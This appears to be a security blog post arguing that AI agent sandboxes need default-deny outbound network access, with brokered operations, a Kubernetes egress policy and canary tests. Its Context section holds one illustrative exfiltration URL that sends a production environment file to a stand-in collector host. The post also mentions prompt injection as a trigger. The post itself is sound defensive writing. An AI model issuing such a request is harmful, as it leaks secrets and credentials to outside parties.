---
title: "A Sandbox With Open Egress Is an Export Path"
date: "2026-10-25"
updated: "2026-10-25"
created_at: "2026-10-25T10:00:00-04:00"
published_at: "2026-10-25T10:00:00-04:00"
scheduled_at: "2026-10-25T10:00:00-04:00"
slug: "a-sandbox-with-open-egress-is-an-export-path"
description: "Filesystem and process isolation limit where an agent can act. If the isolated workload can read sensitive material and make arbitrary outbound requests, it still has a channel for exporting that material."
summary: "Treat outbound network access as a separate, explicit capability. Start an agent sandbox with no egress, then grant only the named destinations and operations a task requires through a broker that can enforce and audit them."
tags: [ai agents, security, developer tooling, infrastructure, reliability]
author: "vabs"
status: "published"
canonical_url: "https://my-slops.github.io/Blog/posts/2026/10/a-sandbox-with-open-egress-is-an-export-path/"
license: "MIT"
audience: "general"
reading_time: "7 min"
---

## TL;DR

An agent sandbox that prevents host writes but permits arbitrary outbound requests has contained execution, not contained data. If a process can read a private repository, a customer export, or an environment variable, a general-purpose HTTP or DNS path can become a way to send those bytes elsewhere.

Treat egress as its own capability. Start with no outbound network access. Where the task genuinely needs a registry, documentation search, model endpoint, or internal API, grant a narrow operation through a policy-enforcing broker and record what was requested and what actually left the boundary.

This is not an argument for disconnecting every agent. It is an argument against calling an environment isolated when its data can still leave through an unrestricted path.

## Context

An agent is asked to fix a dependency problem in a private repository. The runtime gives it a disposable container, a read-only checkout, and blocks the Docker socket. That is a meaningful improvement over running it directly on a developer laptop.

The container still has network access. It can read `config/production.env`, then make a request such as:

```text
https://collector.example/ingest?value=<contents of config/production.env>
```

The sandbox did its local job: it did not let the process overwrite the host. But the important bytes were not supposed to be written locally. They were supposed to leave.

This is not a claim that every networked agent will exfiltrate data. It is a boundary-design observation: a process that can read protected data and choose arbitrary outbound destinations possesses an export capability. Prompt injection, a compromised dependency, or a plain implementation mistake can exercise it.

Docker makes the default easy to underestimate. Containers have networking enabled by default; containers on Docker's default bridge can reach services outside the host when the host has Internet access. [Docker's networking overview](https://docs.docker.com/engine/network/) describes that behavior explicitly. Kubernetes is similarly permissive unless configured otherwise: a Pod is non-isolated for egress by default, so all outbound connections are allowed until an applicable egress `NetworkPolicy` changes that. [Kubernetes' Network Policies documentation](https://kubernetes.io/docs/concepts/services-networking/network-policies/) is clear that ingress and egress isolation are independent.

## Key Points

### A local sandbox and a data boundary answer different questions

Filesystem, process, and privilege controls answer useful questions:

- Can this process modify the host or another workspace?
- Can it mount the container runtime socket or inspect a credential store?
- Can it start unlimited processes or consume all disk?

Egress answers another one:

> Which external systems may receive data that this process can see?

Those controls reinforce one another; none substitutes for the rest. A sandbox with no secrets and no sensitive mounts can tolerate broader egress than one that reads customer data. A sandbox with no egress still needs a useful local-access policy, because it may corrupt files or reveal data through an approved downstream service. The right design starts by naming both sides of each channel: what the workload may read and where it may send.

This is especially important for agents because the process is not limited to one expected code path. It may follow text in an issue, a README, a package install script, or a retrieved web page. [The Untrusted-Content Boundary for AI Writing Agents](https://my-slops.github.io/Blog/posts/2026/03/2026-03-24-the-untrusted-content-boundary-for-ai-writing-agents/) covers the instruction side of that problem. Egress control limits the consequence when untrusted content still manages to influence a command or tool call.

### "Internet access" is too broad a permission

Many developer tasks require a network, but they rarely require the entire Internet.

| Task | The actual network capability | What a broad Internet grant adds |
| --- | --- | --- |
| Install declared dependencies | A specific registry and, sometimes, its artifact host | Arbitrary uploads and unrelated APIs |
| Read an approved API | One service with a named method and resource scope | Calls to every reachable internal service |
| Fetch an approved document | A known origin and bounded response | Arbitrary URLs, redirects, and tracking endpoints |
| Call a model | The selected provider endpoint with a request policy | A generic channel for copied repository or customer content |

The model endpoint row deserves care. Sending context to a model is already egress; whether it is allowed depends on the provider contract, data classification, and the task. Calling the provider does not make other outbound destinations necessary, and a provider allowlist does not make it safe to place every local file in model context.

OWASP identifies data exfiltration through tool calls, API requests, and agent outputs as an agent risk, and its secure-coding guidance specifically recommends egress controls on agent runtimes. [OWASP's AI Agent Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html) and [Secure Coding with AI guidance](https://cheatsheetseries.owasp.org/cheatsheets/Secure_Coding_with_AI_Cheat_Sheet.html) support treating this as a control-plane decision, not an implementation detail hidden in a container image.

### Prefer a brokered operation to a raw network escape hatch

A network allowlist is better than an unrestricted route, but hostname and port alone are often too weak for high-sensitivity work. An allowed host may expose many APIs; a request can carry an arbitrary body; and a tool that follows redirects may leave the destination the policy originally checked.

For an agent that needs network access, expose named operations through a broker where practical:

```ts
type NetworkGrant = {
  operation: "npm_package_download" | "docs_search" | "issue_read";
  destinations: string[];
  maxRequests: number;
  expiresAt: string;
  allowedData: "public" | "repository_metadata";
};

async function docsSearch(query: string, grant: NetworkGrant) {
  assertGrant(grant, {
    operation: "docs_search",
    destination: "https://docs.example.internal",
    dataClass: "repository_metadata",
  });

  return auditedFetch({
    url: "https://docs.example.internal/search",
    method: "POST",
    body: { query },
    maxResponseBytes: 200_000,
  });
}
```

The example is illustrative, not a universal proxy implementation. Its important property is that the agent has `docs_search`, not an unbounded `fetch(url, body)` primitive. The broker can enforce the destination, request count, response limit, credential choice, redirect policy, and data classification. It can also produce an audit event meaningful enough to investigate: *this run used docs search 3 times*, not merely *a container opened TCP connections*.

The same narrowing principle applies to package installation. Prefer a dependency installer that reads a lockfile, uses an approved registry, and records resolved artifacts over a shell that can `curl` arbitrary URLs. If a task needs a new source, force that expansion to be explicit rather than letting an error message quietly upgrade the sandbox's authority.

### Start with deny, then add the traffic the workflow needs

At the infrastructure layer, the usual posture is default-deny egress followed by narrow exceptions. Kubernetes documents a namespace-wide policy that selects all Pods and declares `Egress` without allowing any destinations; policies then add the traffic specific workloads require. NetworkPolicy enforcement depends on the cluster's network plugin, and its standard semantics concern layer-4 connections, so it is not a complete HTTP-content firewall. [Kubernetes' default-deny egress example](https://kubernetes.io/docs/concepts/services-networking/network-policies/#default-deny-all-egress-traffic) and [traffic-filtering notes](https://kubernetes.io/docs/concepts/services-networking/network-policies/#network-traffic-filtering) are useful boundaries to keep in mind.

```yaml
# Baseline for an agent namespace: no outbound connections by default.
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-agent-egress
spec:
  podSelector: {}
  policyTypes:
    - Egress
```

That policy is deliberately incomplete for a working deployment. Most workloads need DNS, and some need a broker, registry, or internal service. Add those paths as small, reviewed policies or route them through the broker rather than adding one broad "temporary" rule. Also test the actual CNI behavior: a YAML resource is not evidence that the traffic is blocked.

Docker has a comparable lesson. A container without an explicit network typically joins the default bridge, which can provide external access. Docker supports internal networks for restricting external access, but a production agent design still has to decide how an allowed package download, documentation lookup, or model call is performed. [Docker's bridge-network documentation](https://docs.docker.com/engine/network/drivers/bridge/) explains both the default bridge behavior and its external masquerading.

### Test the negative path with a harmless canary

Network policy is easy to declare and surprisingly easy to bypass accidentally through a sidecar, a host network setting, an over-broad proxy, or a forgotten alternate protocol. Test the property you want to claim.

For each agent execution profile, run a harmless canary that attempts to reach a destination outside the approved set. It should fail. Then test each allowed operation and inspect its audit record. The test should answer all of these:

1. Can the workload reach an arbitrary public host by IP address and by DNS name?
2. Can it reach cloud metadata services, internal control planes, or other namespaces that the task does not require?
3. Does an allowed tool reject an unapproved redirect or destination change?
4. Can a task pass private file contents in the query string, request body, headers, or a model prompt when its grant permits only repository metadata?
5. Does the audit trail identify the task, operation, destination class, byte limits, and policy decision without recording the secret itself?

The fourth test often exposes a gap in a host-only allowlist. The request went to an allowed service, but the data classification was wrong. That is why egress policy belongs next to credential and tool policy rather than in a separate networking ticket.

## Steps / Code

Review an agent runtime with this sequence:

1. Inventory what sensitive data a task can read: source code, environment variables, credentials, customer records, generated artifacts, and tool outputs.
2. Disable general outbound connectivity for execution profiles that do not need it.
3. Replace raw HTTP, shell download, and generic browser capabilities with named task operations wherever feasible.
4. For every allowed operation, define destination, method, credential, request count, byte limits, redirect behavior, and allowed data class.
5. Deny access to internal metadata and control-plane services unless a task has a documented reason to use them.
6. Test blocked destinations and disallowed data classes, not only successful package downloads.
7. Retain policy-decision logs that make a suspicious request explainable without turning logs into another secret store.

This complements [Capability Leaks Are How Writing Agents Become Ops Risk](https://my-slops.github.io/Blog/posts/2026/03/2026-03-28-capability-leaks-are-how-writing-agents-become-ops-risk/): a raw network primitive is one more capability that turns a narrowly useful agent into a broadly risky one. The remedy is not a ritual approval dialog. It is an enforceable boundary under the model's control surface.

## Trade-offs

Default-deny egress creates friction. Dependency installation can fail because an artifact CDN was omitted; DNS needs explicit treatment; documentation search and browser tasks genuinely require broader access. A proxy or broker becomes another service to operate and can be a bottleneck if its policy language is too rigid.

For a low-sensitivity build in a disposable public repository, unrestricted egress may be an acceptable, documented trade-off. It should be a deliberate exception, not an accidental consequence of a container's default network. For a task that can read production configuration, private source, or customer data, a generic network escape hatch defeats much of the point of local sandboxing.

Do not overstate what egress control provides. It does not make a compromised agent trustworthy, prevent every side channel, or replace data minimization and tool authorization. It does make one important class of mistake and attack harder: turning data the agent can see into data an arbitrary destination can receive.

## References

- Docker Docs, [Networking overview](https://docs.docker.com/engine/network/)
- Docker Docs, [Bridge network driver](https://docs.docker.com/engine/network/drivers/bridge/)
- Kubernetes, [Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- OWASP Cheat Sheet Series, [AI Agent Security](https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html)
- OWASP Cheat Sheet Series, [Secure Coding with AI](https://cheatsheetseries.owasp.org/cheatsheets/Secure_Coding_with_AI_Cheat_Sheet.html)
- This repository, [The Untrusted-Content Boundary for AI Writing Agents](https://my-slops.github.io/Blog/posts/2026/03/2026-03-24-the-untrusted-content-boundary-for-ai-writing-agents/)
- This repository, [Capability Leaks Are How Writing Agents Become Ops Risk](https://my-slops.github.io/Blog/posts/2026/03/2026-03-28-capability-leaks-are-how-writing-agents-become-ops-risk/)

## Final Take

An execution sandbox limits where an agent can run. Egress policy limits where the information it sees can go.

If the task can read sensitive material, do not leave that second boundary implicit. Start with no route out, then grant the smallest network operation the work actually needs and verify that the denied paths stay denied.

## Changelog

- 2026-10-25: Initial publication.
